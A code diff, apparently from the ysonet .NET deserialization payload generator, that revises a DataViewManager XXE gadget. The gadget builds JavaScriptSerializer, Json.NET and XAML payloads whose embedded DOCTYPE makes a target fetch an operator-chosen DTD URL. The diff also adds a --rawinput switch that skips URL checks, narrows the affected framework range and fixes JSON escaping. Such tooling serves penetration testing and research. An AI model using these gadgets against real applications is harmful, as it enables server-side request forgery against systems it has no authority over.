@@ -1,4 +1,4 @@
-using System;
+using NDesk.Options;
 using System.Collections.Generic;
 using ysonet.Helpers;
 
@@ -10,26 +10,51 @@ namespace ysonet.Generators
     /// reader carries a real XmlUrlResolver, so a DOCTYPE with an external parameter entity
     /// makes the deserializing process fetch a URL the operator chooses.
     ///
+    /// "Pre-4.5.2" is a property of the target APPLICATION (the framework it was compiled
+    /// against), not of the framework installed on the machine. A fully patched box runs
+    /// this all day if the app it hosts was built against 4.5.1 - which is why the declared
+    /// version span ends at 4.5.1, and why -t on this tool (which targets 4.7.2) can never
+    /// fetch anything.
+    ///
     /// The effect is a network request made by the target (SSRF / callback). It is NOT file
     /// disclosure: the setter reads elements and attributes only, never entity text, and it
     /// returns nothing to the sender.
     /// </summary>
     public class DataViewManagerXxeGenerator : GenericGenerator
     {
+        // Canonical long name of the escape hatch, so the generator, its help and the tests
+        // cannot drift apart.
+        public const string RawInputOptionName = "rawinput";
+
+        // Shown in the empty-input refusal and in the option help.
+        public const string ExampleUrl = "http://127.0.0.1:8080/x.dtd";
+
+        private bool rawInput;
+
+
         // The effect proven by the tests is one outbound request from the target, so the
         // kind is network. Information disclosure is deliberately NOT declared: an external
         // DTD fetch proves SSRF, and nothing in this chain returns file content to the
         // sender.
         //
-        // Versions stay unspecified on purpose. The gate is not a CLR build: every modern
-        // 4.x runtime still fires this when the deserializing APPLICATION targets pre-4.5.2
-        // or restores the legacy XML settings, and no runtime fires it under the hardened
-        // default. A range would read as "these builds are vulnerable", which is wrong in
-        // both directions, so the real condition is stated in AdditionalInfo() instead.
+        // The version axis describes the TARGET, and here the deciding number is the
+        // framework the target APPLICATION was BUILT against, not the one installed on the
+        // machine it runs on. XmlReaderSettings.EnableLegacyXmlSettings() reads the entry
+        // assembly's TargetFrameworkAttribute once per process: below 4.5.2 the legacy
+        // XmlTextReader gets a real XmlUrlResolver and fetches, 4.5.2 and above gets null
+        // and fetches nothing. So the span ends at 4.5.1, the last version below that
+        // change, and starts at 4.0, the CLR generation this tool targets.
+        //
+        // That is why the installed runtime is irrelevant, and it is measured, not assumed:
+        // the FULL suite fires this in a child stamped 4.5.1 and asserts an otherwise
+        // identical child stamped 4.7.2 fetches nothing - both on whatever modern build the
+        // run happens to be on. The OTHER way in, a machine where the EnableLegacyXmlSettings
+        // switch is turned back on, is not a version at all and stays in AdditionalInfo().
         public override GadgetFacetSet Facets()
         {
             return new GadgetFacetSet()
                 .WithKinds(PayloadKind.Network)
+                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx451))
                 .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework);
         }
 
@@ -81,16 +106,49 @@ namespace ysonet.Generators
             return CommandInputType.Url;
         }
 
-        // No Options() override on purpose, so the gadget reports "no options" the way the
-        // base class does. In particular there is no --rawinput twin of the other non-RCE
-        // gadgets: the URL goes inside a quoted DTD external identifier inside an XML
-        // document inside the outer payload, so an unescaped mode would only be a way to
-        // build a broken or ambiguous payload. ValidateDtdUrl rejects instead.
+        public override OptionSet Options()
+        {
+            // Not RawInputOption(): that shared help says formatter-layer escaping is turned
+            // off, which is NOT what happens here. The finished XML is always escaped for the
+            // outer payload; --rawinput only skips the check on the URL itself.
+            return new OptionSet
+            {
+                {
+                    RawInputOptionName,
+                    "Skip the URL validation and put -c into the DTD external identifier exactly "
+                        + "as typed, with no trimming. Normal mode accepts an absolute http or "
+                        + "https URL and refuses whitespace, control characters and the "
+                        + "characters \" < > \\, because the value goes inside a QUOTED DTD "
+                        + "external identifier and those would corrupt or escape it. Use this "
+                        + "only for research on a resolver that accepts something else; the "
+                        + "network effect this gadget declares was proven with http(s). It does "
+                        + "NOT turn off the outer formatter's escaping, so the payload is still "
+                        + "a valid document - but nothing checks that the identifier inside it "
+                        + "still is, and a broken one simply fetches nothing.",
+                    v => { if (v != null) rawInput = true; }
+                },
+            };
+        }
 
         public override object Generate(string formatter, InputArgs inputArgs)
         {
-            string url = ValidateDtdUrl(inputArgs.Cmd);
-            return FinishHandWrittenPayload(BuildPayload(url, formatter), formatter, inputArgs);
+            string url = rawInput
+                ? DtdSystemLiteral.RequireRawValue(inputArgs == null ? null : inputArgs.Cmd, Name())
+                : DtdSystemLiteral.ValidateHttpUrl(inputArgs == null ? null : inputArgs.Cmd, Name(), ExampleUrl);
+            object payload = FinishHandWrittenPayload(BuildPayload(url, formatter), formatter, inputArgs);
+
+            // On -t with no request, explain that this 4.7.2 build hands its legacy
+            // XmlTextReader a null resolver, so the fetch had nothing to resolve with - the
+            // correct result, not a broken payload. Only printed when -t is used and only
+            // when this process would not have fetched.
+            if (inputArgs != null && inputArgs.Test)
+            {
+                string note = Helpers.Core.LegacyXmlDefaults.SelfTestCannotFetchNote(Name());
+                if (note != null)
+                    System.Console.Error.WriteLine(note);
+            }
+
+            return payload;
         }
 
         // The two spellings of the carrier's name: the assembly qualified form the JSON-family
@@ -118,10 +176,9 @@ namespace ysonet.Generators
                  + "]><DataViewSettingCollectionString/>";
         }
 
-        // Every formatter here sets ONE property by name. The URL is never escaped with
-        // --rawinput: it travels inside a quoted DTD external identifier inside an XML
-        // document inside the outer payload, and ValidateDtdUrl has already rejected the
-        // characters that would break any of those layers.
+        // Every formatter here sets ONE property by name. The finished XML is ALWAYS escaped
+        // for the outer document, --rawinput or not: that switch only decides whether the URL
+        // itself was checked, never whether the payload around it is well formed.
         private object BuildPayload(string url, string formatter)
         {
             string xml = XxeXml(url);
@@ -131,12 +188,16 @@ namespace ysonet.Generators
                 return @"<DataViewManager DataViewSettingCollectionString=""" + EscapeForXmlAttribute(xml, false) + @""" xmlns=""clr-namespace:System.Data;assembly=System.Data"" />";
             }
 
+            // Both JSON templates below quote with DOUBLE quotes, so they escape with
+            // EscapeForJsonDoubleQuoted (only \ and "). EscapeForJson would also write an
+            // apostrophe as \', which is not a legal JSON escape: fastJSON DROPS the
+            // character, and the URL would reach the target with the apostrophe missing.
             if (IsFormatter(formatter, Formatters.JavaScriptSerializer))
             {
                 return @"
 {
     ""__type"":""" + DataViewManagerAssemblyQualifiedName + @""",
-    ""DataViewSettingCollectionString"":""" + EscapeForJson(xml, false) + @"""
+    ""DataViewSettingCollectionString"":""" + EscapeForJsonDoubleQuoted(xml, false) + @"""
 }";
             }
 
@@ -148,7 +209,7 @@ namespace ysonet.Generators
         """ + DataViewManagerAssemblyQualifiedName + @""":""1""
     },
     ""$type"":""1"",
-    ""DataViewSettingCollectionString"":""" + EscapeForJson(xml, false) + @"""
+    ""DataViewSettingCollectionString"":""" + EscapeForJsonDoubleQuoted(xml, false) + @"""
 }";
             }
 
@@ -183,44 +244,8 @@ namespace ysonet.Generators
             public string DataViewSettingCollectionString { get; set; }
         }
 
-        /// <summary>
-        /// The URL is placed in a quoted DTD external identifier (a SystemLiteral), so the
-        /// one character it can never carry is the double quote that would end the literal.
-        /// Whitespace, control characters, and raw angle brackets are rejected too: none of
-        /// them are valid in a URL, and they are the ones that survive escaping badly.
-        ///
-        /// '&amp;' and '%' are deliberately ALLOWED. A SystemLiteral recognises neither
-        /// entity nor parameter-entity references, so both are literal there, and banning
-        /// them would break ordinary query strings and percent-encoding.
-        /// </summary>
-        internal static string ValidateDtdUrl(string url)
-        {
-            if (string.IsNullOrWhiteSpace(url))
-                throw new ArgumentException(
-                    "DataViewManagerXxe requires an external DTD URL in -c, for example -c \"http://127.0.0.1:8080/x.dtd\".");
-
-            url = url.Trim();
-
-            foreach (char c in url)
-            {
-                if (char.IsControl(c) || char.IsWhiteSpace(c))
-                    throw new ArgumentException(
-                        "The DTD URL must not contain whitespace or control characters. Percent-encode them instead.");
-                if (c == '"' || c == '<' || c == '>' || c == '\\')
-                    throw new ArgumentException(
-                        "The DTD URL must not contain the characters \" < > or \\, because it is placed in a quoted DTD external identifier. Percent-encode them instead.");
-            }
-
-            Uri parsed;
-            if (!Uri.TryCreate(url, UriKind.Absolute, out parsed))
-                throw new ArgumentException(
-                    "The DTD URL must be an absolute URL, for example http://127.0.0.1:8080/x.dtd.");
-
-            if (parsed.Scheme != Uri.UriSchemeHttp && parsed.Scheme != Uri.UriSchemeHttps)
-                throw new ArgumentException(
-                    "The DTD URL must use http or https. Scheme '" + parsed.Scheme + "' is not supported by this gadget.");
-
-            return url;
-        }
+        // The URL check lives in Helpers/Input/DtdSystemLiteral, because it is mechanics
+        // shared with the other external-DTD gadget and names no gadget of its own. What
+        // stays here is the payload: the DOCTYPE template above.
     }
 }
